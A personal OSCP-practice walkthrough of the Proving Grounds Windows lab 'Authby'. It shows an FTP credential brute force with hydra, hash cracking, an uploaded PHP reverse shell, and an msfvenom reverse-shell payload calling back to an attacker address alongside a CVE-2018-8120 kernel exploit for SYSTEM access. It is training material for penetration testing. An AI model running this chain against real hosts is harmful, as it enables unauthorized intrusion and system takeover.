---
Date: 2024-10-25
Course: "[[OSCP]]"
Platform: PG-Practice
Category: Windows
Difficulty: Intermediate
Status: Complete
IP: 192.168.171.46
Writeup: https://medium.com/@vivek-kumar/offensive-security-proving-grounds-walk-through-authby-7d0391b0897c
Writeup2: https://medium.com/@ardian.danny/oscp-practice-series-28-proving-grounds-authby-e2ed7f710322
---
# Authby
These Windows are doing my absolute head in. I spent hours on this box the day before following a multiple walkthroughs to the letter and got nowhere. I and wound up feeling so frustrated at not receiving even an initial shell that I marked this box as "Aborted" and shut down for the night - I figured there was no point pushing on and to just move on to the next Windows box.

Came back the next day, booted up, and figured I'd give this one more go with the same exploits that had failed the day before... and it FUCKING WORKED?!?!?! No explanation or reason for why it didn't work 24hours earlier - it simply refused to work one day, then worked easily the next.

Besides being insanely frustrating, I will admit learning about the Windows kernel exploits was cool. Understanding the link between the website and the FTP connection was interesting too, and it was great to see Hydra work perfectly - I was genuinely surprised when I checked on it and found it had not only finished, but had returned THREE sets of credentials (although two were duplicates).

Biggest lesson out of this is to simply walk away when it's clear the box is fighting me. I never experienced this kind of unreliable bullshit with the Linux boxes, but I guess this is Windows. Going forward I'm setting a hard limit of 2 hours on a box - if I've tried my own enumeration, then followed walkthroughs, and still can't get initial access after 2 hours then this will not be the day to succeed on that box. Better to shut it down and potentially work on a different one, then come back to it later (probably the next day) and try again, than it is to keep fighting and only becoming more frustrated (and then absolutely enraged when the exploits work perfectly the next day).
# Resolution summary
- Ran Nmap to identify ports `21`,`242` & `3389` 
- Ran `hydra` against FTP service on port 22 and identified `admin:admin` credentials
- Logged into FTP service as `admin` and found credentials `offsec:elite`
- Accessed webpage hosted on port `242` using `offsec:elite` 
- Identified webpage matched `index.php` in FTP root directory
- Created `shell.php`, uploaded via FTP,
- Accessed `shell.php` via browser and received reverse shell
- Identified windows kernel vulnerability CVE-2018-8120, and uploaded appropriate exploit executable `x86.exe` via FTP
- Created and uploaded reverse shell executable `reverse.exe` via FTP
- Executed `x86.exe reverse.exe` to receive 2nd reverse shell as `NT System`
## Improved skills
- Using Windows kernel exploits
- Running hydra
## Used tools
- nmap
- hydra
- msfvenom

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -p- -n -vvv -oN Authby.nmap 192.168.171.46
---
PORT     STATE SERVICE       REASON
21/tcp   open  ftp           syn-ack ttl 125
242/tcp  open  direct        syn-ack ttl 125
3145/tcp open  csi-lfap      syn-ack ttl 125
3389/tcp open  ms-wbt-server syn-ack ttl 125
```

Enumerated open TCP ports:
```bash
sudo nmap -p 21,242,3145,3389 -A 192.168.171.46 -oN authby-tcp.nmap -v --script=vulners --script-args mincvss=9.0
---
PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                zFTPServer 6.0 build 2011-10-17
242/tcp  open  http               Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
| vulners: 
|   cpe:/a:apache:http_server:2.2.21: 
|       C94CBDE1-4CC5-5C06-9D18-23CAB216705E    10.0    https://vulners.com/githubexploit/C94CBDE1-4CC5-5C06-9D18-23CAB216705E        *EXPLOIT*
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A        *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A        *EXPLOIT*
|       PACKETSTORM:181114      9.8     https://vulners.com/packetstorm/PACKETSTORM:181114      *EXPLOIT*
|       MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-       9.8     https://vulners.com/metasploit/MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-      *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH-       9.8     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH-      *EXPLOIT*
|       F9C0CD4B-3B60-5720-AE7A-7CC31DB839C5    9.8     https://vulners.com/githubexploit/F9C0CD4B-3B60-5720-AE7A-7CC31DB839C5        *EXPLOIT*
|       F41EE867-4E63-5259-9DF0-745881884D04    9.8     https://vulners.com/githubexploit/F41EE867-4E63-5259-9DF0-745881884D04        *EXPLOIT*
|       EDB-ID:51193    9.8     https://vulners.com/exploitdb/EDB-ID:51193      *EXPLOIT*
|       EDB-ID:50512    9.8     https://vulners.com/exploitdb/EDB-ID:50512      *EXPLOIT*
|       EDB-ID:50446    9.8     https://vulners.com/exploitdb/EDB-ID:50446      *EXPLOIT*
|       EDB-ID:50406    9.8     https://vulners.com/exploitdb/EDB-ID:50406      *EXPLOIT*
|       E796A40A-8A8E-59D1-93FB-78EF4D8B7FA6    9.8     https://vulners.com/githubexploit/E796A40A-8A8E-59D1-93FB-78EF4D8B7FA6        *EXPLOIT*
|       D10426F3-DF82-5439-AC3E-6CA0A1365A09    9.8     https://vulners.com/githubexploit/D10426F3-DF82-5439-AC3E-6CA0A1365A09        *EXPLOIT*
|       D0368327-F989-5557-A5C6-0D9ACDB4E72F    9.8     https://vulners.com/githubexploit/D0368327-F989-5557-A5C6-0D9ACDB4E72F        *EXPLOIT*
|       CVE-2022-31813  9.8     https://vulners.com/cve/CVE-2022-31813
|       CVE-2022-22720  9.8     https://vulners.com/cve/CVE-2022-22720
|       CVE-2021-44790  9.8     https://vulners.com/cve/CVE-2021-44790
|       CVE-2021-42013  9.8     https://vulners.com/cve/CVE-2021-42013
|       CVE-2021-39275  9.8     https://vulners.com/cve/CVE-2021-39275
|       CVE-2021-26691  9.8     https://vulners.com/cve/CVE-2021-26691
|       CVE-2018-1312   9.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-7679   9.8     https://vulners.com/cve/CVE-2017-7679
|       CVE-2017-3169   9.8     https://vulners.com/cve/CVE-2017-3169
|       CVE-2017-3167   9.8     https://vulners.com/cve/CVE-2017-3167
|       CC15AE65-B697-525A-AF4B-38B1501CAB49    9.8     https://vulners.com/githubexploit/CC15AE65-B697-525A-AF4B-38B1501CAB49        *EXPLOIT*
|       C879EE66-6B75-5EC8-AA68-08693C6CCAD1    9.8     https://vulners.com/githubexploit/C879EE66-6B75-5EC8-AA68-08693C6CCAD1        *EXPLOIT*
|       C5A61CC6-919E-58B4-8FBB-0198654A7FC8    9.8     https://vulners.com/githubexploit/C5A61CC6-919E-58B4-8FBB-0198654A7FC8        *EXPLOIT*
|       BF9B0898-784E-5B5E-9505-430B58C1E6B8    9.8     https://vulners.com/githubexploit/BF9B0898-784E-5B5E-9505-430B58C1E6B8        *EXPLOIT*
|       B02819DB-1481-56C4-BD09-6B4574297109    9.8     https://vulners.com/githubexploit/B02819DB-1481-56C4-BD09-6B4574297109        *EXPLOIT*
|       ACD5A7F2-FDB2-5859-8D23-3266A1AF6795    9.8     https://vulners.com/githubexploit/ACD5A7F2-FDB2-5859-8D23-3266A1AF6795        *EXPLOIT*
|       A90ABEAD-13A8-5F09-8A19-6D9D2D804F05    9.8     https://vulners.com/githubexploit/A90ABEAD-13A8-5F09-8A19-6D9D2D804F05        *EXPLOIT*
|       A8616E5E-04F8-56D8-ACB4-32FDF7F66EED    9.8     https://vulners.com/githubexploit/A8616E5E-04F8-56D8-ACB4-32FDF7F66EED        *EXPLOIT*
|       A5425A79-9D81-513A-9CC5-549D6321897C    9.8     https://vulners.com/githubexploit/A5425A79-9D81-513A-9CC5-549D6321897C        *EXPLOIT*
|       A2D97DCC-04C2-5CB1-921F-709AA8D7FD9A    9.8     https://vulners.com/githubexploit/A2D97DCC-04C2-5CB1-921F-709AA8D7FD9A        *EXPLOIT*
|       9B4F4E4A-CFDF-5847-805F-C0BAE809DBD5    9.8     https://vulners.com/githubexploit/9B4F4E4A-CFDF-5847-805F-C0BAE809DBD5        *EXPLOIT*
|       907F28D0-5906-51C7-BAA3-FEBD5E878801    9.8     https://vulners.com/githubexploit/907F28D0-5906-51C7-BAA3-FEBD5E878801        *EXPLOIT*
|       8A57FAF6-FC91-52D1-84E0-4CBBAD3F9677    9.8     https://vulners.com/githubexploit/8A57FAF6-FC91-52D1-84E0-4CBBAD3F9677        *EXPLOIT*
|       88EB009A-EEFF-52B7-811D-A8A8C8DE8C81    9.8     https://vulners.com/githubexploit/88EB009A-EEFF-52B7-811D-A8A8C8DE8C81        *EXPLOIT*
|       8713FD59-264B-5FD7-8429-3251AB5AB3B8    9.8     https://vulners.com/githubexploit/8713FD59-264B-5FD7-8429-3251AB5AB3B8        *EXPLOIT*
|       866E26E3-759B-526D-ABB5-206B2A1AC3EE    9.8     https://vulners.com/githubexploit/866E26E3-759B-526D-ABB5-206B2A1AC3EE        *EXPLOIT*
|       86360765-0B1A-5D73-A805-BAE8F1B5D16D    9.8     https://vulners.com/githubexploit/86360765-0B1A-5D73-A805-BAE8F1B5D16D        *EXPLOIT*
|       831E1114-13D1-54EF-BDE4-F655114CDC29    9.8     https://vulners.com/githubexploit/831E1114-13D1-54EF-BDE4-F655114CDC29        *EXPLOIT*
|       805E6B24-8DF9-51D8-8DF6-6658161F96EA    9.8     https://vulners.com/githubexploit/805E6B24-8DF9-51D8-8DF6-6658161F96EA        *EXPLOIT*
|       7E615961-3792-5896-94FA-1F9D494ACB36    9.8     https://vulners.com/githubexploit/7E615961-3792-5896-94FA-1F9D494ACB36        *EXPLOIT*
|       78787F63-0356-51EC-B32A-B9BD114431C3    9.8     https://vulners.com/githubexploit/78787F63-0356-51EC-B32A-B9BD114431C3        *EXPLOIT*
|       6CAA7558-723B-5286-9840-4DF4EB48E0AF    9.8     https://vulners.com/githubexploit/6CAA7558-723B-5286-9840-4DF4EB48E0AF        *EXPLOIT*
|       6A0A657E-8300-5312-99CE-E11F460B1DBF    9.8     https://vulners.com/githubexploit/6A0A657E-8300-5312-99CE-E11F460B1DBF        *EXPLOIT*
|       64D31BF1-F977-51EC-AB1C-6693CA6B58F3    9.8     https://vulners.com/githubexploit/64D31BF1-F977-51EC-AB1C-6693CA6B58F3        *EXPLOIT*
|       61075B23-F713-537A-9B84-7EB9B96CF228    9.8     https://vulners.com/githubexploit/61075B23-F713-537A-9B84-7EB9B96CF228        *EXPLOIT*
|       5312D04F-9490-5472-84FA-86B3BBDC8928    9.8     https://vulners.com/githubexploit/5312D04F-9490-5472-84FA-86B3BBDC8928        *EXPLOIT*
|       52E13088-9643-5E81-B0A0-B7478BCF1F2C    9.8     https://vulners.com/githubexploit/52E13088-9643-5E81-B0A0-B7478BCF1F2C        *EXPLOIT*
|       495E99E5-C1B0-52C1-9218-384D04161BE4    9.8     https://vulners.com/githubexploit/495E99E5-C1B0-52C1-9218-384D04161BE4        *EXPLOIT*
|       44E43BB7-6255-58E7-99C7-C3B84645D497    9.8     https://vulners.com/githubexploit/44E43BB7-6255-58E7-99C7-C3B84645D497        *EXPLOIT*
|       40F21EB4-9EE8-5ED1-B561-0A2B8625EED3    9.8     https://vulners.com/githubexploit/40F21EB4-9EE8-5ED1-B561-0A2B8625EED3        *EXPLOIT*
|       37634050-FDDF-571A-90BB-C8109824B38D    9.8     https://vulners.com/githubexploit/37634050-FDDF-571A-90BB-C8109824B38D        *EXPLOIT*
|       30293CDA-FDB1-5FAF-9622-88427267F204    9.8     https://vulners.com/githubexploit/30293CDA-FDB1-5FAF-9622-88427267F204        *EXPLOIT*
|       2B3110E1-BEA0-5DB8-93AD-1682230F3E19    9.8     https://vulners.com/githubexploit/2B3110E1-BEA0-5DB8-93AD-1682230F3E19        *EXPLOIT*
|       22DCCD26-B68C-5905-BAC2-71D10DE3F123    9.8     https://vulners.com/githubexploit/22DCCD26-B68C-5905-BAC2-71D10DE3F123        *EXPLOIT*
|       2108729F-1E99-54EF-9A4B-47299FD89FF2    9.8     https://vulners.com/githubexploit/2108729F-1E99-54EF-9A4B-47299FD89FF2        *EXPLOIT*
|       1C39E10A-4A38-5228-8334-2A5F8AAB7FC3    9.8     https://vulners.com/githubexploit/1C39E10A-4A38-5228-8334-2A5F8AAB7FC3        *EXPLOIT*
|       1337DAY-ID-37777        9.8     https://vulners.com/zdt/1337DAY-ID-37777        *EXPLOIT*
|       1337DAY-ID-36952        9.8     https://vulners.com/zdt/1337DAY-ID-36952        *EXPLOIT*
|       11813536-2AFF-5EA4-B09F-E9EB340DDD26    9.8     https://vulners.com/githubexploit/11813536-2AFF-5EA4-B09F-E9EB340DDD26        *EXPLOIT*
|       0C47BCF2-EA6F-5613-A6E8-B707D64155DE    9.8     https://vulners.com/githubexploit/0C47BCF2-EA6F-5613-A6E8-B707D64155DE        *EXPLOIT*
|       0AA6A425-25B1-5D2A-ABA1-2933D3E1DC56    9.8     https://vulners.com/githubexploit/0AA6A425-25B1-5D2A-ABA1-2933D3E1DC56        *EXPLOIT*
|       07AA70EA-C34E-5F66-9510-7C265093992A    9.8     https://vulners.com/githubexploit/07AA70EA-C34E-5F66-9510-7C265093992A        *EXPLOIT*
|       PACKETSTORM:164501      0.0     https://vulners.com/packetstorm/PACKETSTORM:164501      *EXPLOIT*
|       PACKETSTORM:164418      0.0     https://vulners.com/packetstorm/PACKETSTORM:164418      *EXPLOIT*
|       EDB-ID:41769    0.0     https://vulners.com/exploitdb/EDB-ID:41769      *EXPLOIT*
|       EDB-ID:41768    0.0     https://vulners.com/exploitdb/EDB-ID:41768      *EXPLOIT*
|       EDB-ID:36352    0.0     https://vulners.com/exploitdb/EDB-ID:36352      *EXPLOIT*
|       EDB-ID:34133    0.0     https://vulners.com/exploitdb/EDB-ID:34133      *EXPLOIT*
|       EDB-ID:31052    0.0     https://vulners.com/exploitdb/EDB-ID:31052      *EXPLOIT*
|       EDB-ID:18442    0.0     https://vulners.com/exploitdb/EDB-ID:18442      *EXPLOIT*
|_      1337DAY-ID-16843        0.0     https://vulners.com/zdt/1337DAY-ID-16843        *EXPLOIT*
3145/tcp open  zftp-admin         zFTPServer admin
3389/tcp open  ssl/ms-wbt-server?
```
---
# Enumeration
## Port 21 - FTP (zFTPServer 6.0)
- Ran `ftp 192.168.171.46` and used username `anonymous`
![[Cybersecurity-Resources/images/Pasted image 20241025194245.png]]
- Change directory to `accounts` and identified three `uac` accounts including `admin` and `Offsec`
![[Cybersecurity-Resources/images/Pasted image 20241025194448.png]]
- Navigated to `/` directory and unsuccessfully attempted to run `get settings.ini`
![[Cybersecurity-Resources/images/Pasted image 20241025194627.png]]
- Exited ftp login, and ran `hydra 192.168.171.46 ftp -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt` to brute force other logins - identified credentials `admin:admin` `anonymous:anonymous` `Admin:admin`
![[Cybersecurity-Resources/images/Pasted image 20241025201654.png]]
- Ran `ftp 192.168.171.46` with credentials `admin:admin` and identified three available files
![[Cybersecurity-Resources/images/Pasted image 20241025201910.png]]
- Used `get` to download all three files and inspected individually. 
	- Ran `cat index.php` - identified a quote from Plautus
![[Cybersecurity-Resources/images/Pasted image 20241025202406.png]]
	- Ran `cat .htaccess`
![[Cybersecurity-Resources/images/Pasted image 20241025202537.png]]
	- Ran `cat .htpasswd` - identified password hash for user `offsec:offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0`
![[Cybersecurity-Resources/images/Pasted image 20241025202711.png]]
- Saved `offsec:offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0` as `offsec.hash` and ran `john offsec.hash` to crack password hash - identified credentials `offsec:elite`
![[Cybersecurity-Resources/images/Pasted image 20241025203051.png]]
## Port 242 - HTTP (Apache/2.2.21)
- Navigated to `http://192.168.171.46:242` and identified web login
![[Cybersecurity-Resources/images/Pasted image 20241025201023.png]]
- Attempted password guessing with `admin:admin`, `root:root`, `admin:password` - unsuccessful.
- Attempted login with cracked credentials `offsec:elite` and accessed page
![[Cybersecurity-Resources/images/Pasted image 20241025203334.png]]
## Port 3389 - RDP 
- Attempted login with cracked credentials `offsec:elite` - unsuccessful
![[Cybersecurity-Resources/images/Pasted image 20241025203610.png]]

---
# Exploitation
- Created `shell.php` with reverse shell back to Kali host
![[Cybersecurity-Resources/images/Pasted image 20241025204143.png]]
- Ran `put shell.php` on `ftp` service as `admin` to upload reverse shell
![[Cybersecurity-Resources/images/Pasted image 20241025204306.png]]
- Started netcat listener on port `1234` with `nc -nvlp 1234` then used web browser to navigate to `http://192.168.171.46:242/shell.php`, and received reverse shell
![[Cybersecurity-Resources/images/Pasted image 20241025204007.png]]
---
# Lateral Movement to user
## Local Enumeration
- Navigated to `C:\Users\apache\Desktop` and ran `type local.txt` to print `98e8a3c01c8d7944c46cf806438ed074`
![[Cybersecurity-Resources/images/Pasted image 20241025204654.png]]
- Ran `systeminfo` to get host details, and identified OS Name `Microsoftr Windows Serverr 2008 Standard` with system-type `x86` architecture - OS is vulnerable to CVE-2018-8120
![[Cybersecurity-Resources/images/Pasted image 20241025220625.png]]
---
# Privilege Escalation
## CVE-2018-8120
 Identified Windows Kernel Exploit for CVE-2018-8120 from https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-8120 and downloaded `x86.exe` to Kali host
- Ran `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.199 LPORT=80 -f exe > reverse.exe`
- Uploaded `x86.exe` & `reverse.exe` to target via `FTP` while logged in as `admin:admin`
- Started netcat listener on port `80`, then returned to reverse shell and ran `x86.exe reverse.exe`
![[Cybersecurity-Resources/images/Pasted image 20241026183414.png]]
- Checked reverse shell and found incoming connection
![[Cybersecurity-Resources/images/Pasted image 20241026183445.png]]
- Navigated to `C:\Users\Administrator\Desktop` and ran `type proof.txt` to print `fb1863d6c3980a8502ac04794d08b5a4`

---
# Trophy & Loot
`local.txt` = `98e8a3c01c8d7944c46cf806438ed074`
`proof.txt` = `fb1863d6c3980a8502ac04794d08b5a4